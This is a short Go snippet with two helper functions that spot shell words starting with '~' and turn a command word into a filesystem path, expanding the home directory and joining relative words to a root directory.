// isHomeWord reports whether word starts with the shell's `~` (home).
func isHomeWord(word string) bool { return word == "~" || strings.HasPrefix(word, "~/") }

// wordPath is the path a command word names from root: `~` is the home
// directory, a relative word is relative to root. "" when the home directory
// is unknown.
func wordPath(root, word string) string {
	switch {
	case isHomeWord(word):
		home, err := os.UserHomeDir()
		if err != nil {
			return ""
		}
		return filepath.Join(home, word[1:])
	case !filepath.IsAbs(word):
		return filepath.Join(root, word)
	}
	return word
}
